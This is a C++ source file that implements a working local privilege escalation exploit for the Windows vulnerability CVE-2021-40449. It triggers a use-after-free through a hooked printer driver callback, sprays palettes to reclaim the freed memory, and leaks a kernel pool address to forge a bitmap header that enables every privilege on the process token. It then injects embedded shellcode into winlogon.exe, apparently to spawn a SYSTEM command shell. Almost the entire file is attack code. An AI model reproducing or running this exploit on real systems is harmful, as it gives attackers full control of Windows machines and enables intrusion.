#include "exp.hpp"
using namespace CVE_2021_40449;
namespace offset = exploit::gadget::X_17763_737;
namespace CVE_2021_40449
{
    VOID InjectToWinlogon()
    {
        /* Inject `payload` (shellcode) into winlogon.exe */
        unsigned char payload[] =
            "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
            "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
            "\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
            "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
            "\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
            "\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
            "\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
            "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
            "\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
            "\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
            "\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
            "\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
            "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
            "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
            "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
            "\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
            "\x78\x65\x00";

        PROCESSENTRY32 entry;
        HANDLE snapshot, proc;

        entry.dwSize = sizeof(PROCESSENTRY32);

        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

        INT pid = -1;
        if (Process32First(snapshot, &entry))
        {
            while (Process32Next(snapshot, &entry))
            {
                if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
                {
                    pid = entry.th32ProcessID;
                    break;
                }
            }
        }

        CloseHandle(snapshot);

        if (pid < 0)
        {
            puts("[-] Could not find winlogon.exe");
            return;
        }

        proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (proc == NULL)
        {
            puts("[-] Failed to open process. Exploit did probably not work");
            return;
        }

        LPVOID buffer = VirtualAllocEx(proc, NULL, sizeof(payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (buffer == NULL)
        {
            printf("[-] Failed to allocate remote memory");
        }

        if (!WriteProcessMemory(proc, buffer, payload, sizeof(payload), 0))
        {
            puts("[-] Failed to write to remote memory");
            return;
        }

        HANDLE hthread = CreateRemoteThread(proc, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

        if (hthread == INVALID_HANDLE_VALUE)
        {
            puts("[-] Failed to create remote thread");
            return;
        }
    }


    VOID EXPSprayPalettes(DWORD size)
    {
        /* Spray palettes to reclaim freed memory */

        DWORD palCount = (size - 0x90) / 4;
        DWORD palSize = sizeof(LOGPALETTE) + (palCount - 1) * sizeof(PALETTEENTRY);
        LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palSize);

        if (lPalette == NULL) {
            puts("[-] Failed to create palette");
            return;
        }

        DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);

        // Will call: RtlSetAllBits(BitMapHeader), where BitMapHeader is a forged
        // to point to the current process token (See `CreateForgedBitMapHeader`)
        // This will enable all privileges

        // Offset is specific to each version. Spray the two pointers
        // Arg1 (BitMapHeader)
        for (DWORD i = 0; i < 0x120; i++) {
            p[i] = fakeRtlBitMapAddr;
            // p[0xe5] = fakeRtlBitMapAddr;
        }

        // Function pointer (RtlSetAllBits)
        for (DWORD i = 0x120; i < (palSize - 4) / 8; i++) {
            p[i] = rtlSetAllBits;
            // p[0x15b] = rtlSetAllBits;
        }


        lPalette->palNumEntries = (WORD)palCount;
        lPalette->palVersion = 0x300;

        // Create lots of palettes
        for (DWORD i = 0; i < 0x5000; i++)
        {
            CreatePalette(lPalette);
        }
    }

    DHPDEV EXPhook_DrvEnablePDEV(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver) {
        puts("[*] EXPLOIT Hooked DrvEnablePDEV called");

        DHPDEV res = oldFuncPtr(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);

        // Check if we should trigger the vulnerability
        if (trigger == TRUE)
        {
            // We only want to trigger the vulnerability once
            trigger = FALSE;

            // Trigger vulnerability with second ResetDC. This will destroy the original
            // device context, while we're still inside of the first ResetDC. This will
            // result in a UAF
            puts("[*] Triggering UAF with second ResetDC");
            HDC tmp_hdc = ResetDCW(pocHDC, NULL);

            puts("[*] Returned from second ResetDC");

            // This is where we reclaim the freed memory and overwrite the function pointer
            // and argument. We will use palettes to reclaim the freed memory

            puts("[*] Spraying palettes");

            EXPSprayPalettes(0xe20);

            puts("[*] Done spraying palettes");
        }

        return res;
    }

    DWORD64 CreateForgedBitMapHeader(DWORD64 token)
    {
        /* Create a forged BitMapHeader on the large pool to be used in RtlSetAllBits */

        // Cool trick taken from:
        // https://github.com/KaLendsi/CVE-2021-40449-Exploit/blob/main/CVE-2021-40449-x64.cpp#L448
        // https://gist.github.com/hugsy/d89c6ee771a4decfdf4f088998d60d19

        DWORD dwBufSize, dwOutSize, dwThreadID, dwExpectedSize;
        HANDLE hThread;
        USHORT dwSize;
        LPVOID lpMessageToStore, pBuffer;
        UNICODE_STRING target;
        HRESULT hRes;
        ULONG_PTR StartAddress, EndAddress, ptr;
        PBIG_POOL_INFO info;


        NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdllModule, "NtQuerySystemInformation");
        NtSetInformationThread_t SetInformationThread = (NtSetInformationThread_t)GetProcAddress(ntdllModule, "NtSetInformationThread");

        hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)NULL, 0, CREATE_SUSPENDED, &dwThreadID);

        dwSize = 0x1000;

        lpMessageToStore = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_READWRITE);

        memset(lpMessageToStore, 0x41, 0x20);

        // BitMapHeader->SizeOfBitMap
        *(DWORD64*)lpMessageToStore = 0x80;

        // BitMapHeader->Buffer
        *(DWORD64*)((DWORD64)lpMessageToStore + 8) = token;

        target = {};

        target.Length = dwSize;
        target.MaximumLength = 0xffff;
        target.Buffer = (PWSTR)lpMessageToStore;

        hRes = SetInformationThread(hThread, (THREADINFOCLASS)ThreadNameInformation, &target, 0x10);

        dwBufSize = 1024 * 1024;
        pBuffer = LocalAlloc(LPTR, dwBufSize);

        hRes = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, pBuffer, dwBufSize, &dwOutSize);

        dwExpectedSize = target.Length + sizeof(UNICODE_STRING);

        StartAddress = (ULONG_PTR)pBuffer;
        EndAddress = StartAddress + 8 + *((PDWORD)StartAddress) * sizeof(BIG_POOL_INFO);
        ptr = StartAddress + 8;
        while (ptr < EndAddress)
        {
            info = (PBIG_POOL_INFO)ptr;

            if (strncmp(info->PoolTag, "ThNm", 4) == 0 && dwExpectedSize == info->PoolSize)
            {
                return (((ULONG_PTR)info->Address) & 0xfffffffffffffff0) + sizeof(UNICODE_STRING);
            }
            ptr += sizeof(BIG_POOL_INFO);
        }

        printf("[-] Failed to leak pool address for forged BitMapHeader\n");

        return NULL;
    }

    bool Exp() {
        printf("EXP pid: 0x%X\n", GetCurrentProcessId());
        if (!initAPI())
            return false;
        DWORD64 tokenKernelAddress = 0;
        HANDLE token, hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, GetCurrentProcessId());
        OpenProcessToken(hProc, TOKEN_ADJUST_PRIVILEGES, &token);
        exploit::memtools::bFindHandleObject(GetCurrentProcessId(), reinterpret_cast<ULONG_PTR>(token), reinterpret_cast<ULONG_PTR>(&tokenKernelAddress));
        printf("[+] Process token address: 0x%p\n", tokenKernelAddress);

        auto kernelBase = exploit::memtools::ulGetKernelBase((PCHAR)"ntoskrnl.exe");

        kernelModule = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (kernelModule == NULL) {
            puts("[-] Failed to load kernel module");
            return false;
        }
        auto rtlSetAllBitsOffset = (DWORD64)GetProcAddress(kernelModule, "RtlSetAllBits");
        if (rtlSetAllBitsOffset == NULL) {
            puts("[-] Failed to find RtlSetAllBits");
            return false;
        }
        rtlSetAllBits = (DWORD64)kernelBase + rtlSetAllBitsOffset - (DWORD64)kernelModule;
        fakeRtlBitMapAddr = CVE_2021_40449::CreateForgedBitMapHeader(tokenKernelAddress + 0x40);
        if (fakeRtlBitMapAddr == NULL) {
            puts("[-] Failed to pool leak address of token");
            return FALSE;
        }
        printf("[+] kernelBase: 0x%p\n", kernelBase);
        printf("[+] rtlSetAllBitsOffset: 0x%p\n", rtlSetAllBits);
        printf("[+] fakeRtlBitMapAddr: 0x%p\n", fakeRtlBitMapAddr);

        findPrinters(EXPhook_DrvEnablePDEV);
        pocHDC = CreateDCW(NULL, printerName, NULL, NULL);
        trigger = true;
        ResetDC(pocHDC, NULL);
        InjectToWinlogon();
        return true;
    };

} // namespace CVE_2021_40449